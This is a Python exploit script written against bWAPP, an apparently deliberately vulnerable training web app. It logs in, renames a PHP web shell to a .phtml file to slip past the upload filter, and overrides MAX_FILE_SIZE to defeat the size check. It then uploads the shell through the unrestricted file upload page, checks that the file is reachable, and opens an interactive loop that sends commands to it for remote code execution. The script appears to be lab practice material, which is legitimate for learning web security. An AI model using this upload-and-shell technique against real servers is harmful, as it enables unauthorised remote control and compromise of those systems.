from bWAPP import login, TARGET
from re import search, S
from pathlib import Path
from random import randint

# Do login
bwapp_session = login(verbose=True)

if not bwapp_session:
    exit(1)

SHELL_FILE = "web-shell.php"
BASE_DIR = Path(__file__).resolve().parent
LOCAL_SHELL_FILE = f"{Path.joinpath(BASE_DIR, SHELL_FILE)}"

with open(LOCAL_SHELL_FILE, 'rb') as file:

    new_filename = f"{SHELL_FILE.replace(".php", f"-{randint(0, 10000)}.phtml")}"
    print("[+] Rename file using .phtml ext to process file as PHP Code and ensure filter evasion ... ")

    print(f"[+] New filename: {new_filename}")

    files = {
        "file": (new_filename, file, "application/octet-stream")
    }

    data = {
        "MAX_FILE_SIZE": "9999", # Bypass max file size
        "form": "Upload"
    }

    try:
        print("[+] Set MAX_FILE_SIZE param to 9999 instead of 10 to bypass file size check.")
        print(f"[+] Uploading {SHELL_FILE} ...")
        
        req = bwapp_session.post(f"{TARGET}/unrestricted_file_upload.php", files=files, data=data)
        
        # Check if file exist after upload
        print(f"[+] Check file into images directory ...")
        file_path = f"{TARGET}/images/{new_filename}"
        check_file = bwapp_session.get(file_path)
        if check_file.status_code == 200:
            print(f"[+] Shell uploaded to {file_path}\n")
        else:
            print("[-] Error while upload shell...\n Exiting.")
            exit(1)
    except Exception as error:
        print(error)

# Use local shell to send commands over HTTP connection using new file uploaded
print("[+] Starting interactive shell connection ...")
while True:
    cmd = input("Shell > ").strip()

    if not cmd:
        continue

    if cmd in ("exit", "quit", "stop"):
        break

    rce = bwapp_session.get(f"{TARGET}/images/{new_filename}", params={ "cmd": cmd})
    output = search(r'<div class="output">(.*?)</div>', rce.text, S)
    print(output.group(1).strip())